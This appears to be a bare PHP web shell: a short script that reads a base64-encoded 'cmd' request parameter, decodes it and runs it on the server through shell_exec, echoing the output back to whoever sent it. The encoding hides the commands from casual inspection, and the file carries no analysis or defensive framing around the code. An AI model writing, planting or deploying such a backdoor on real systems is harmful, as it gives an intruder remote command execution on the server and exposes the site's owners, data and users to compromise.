<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('shell_exec')){
		$s_out = @shell_exec($s_c);
		return $s_out;
	}
}

if(isset($_REQUEST['cmd'])){
	$s_cmd = base64_decode($_REQUEST['cmd']);
	echo exe($s_cmd);
?>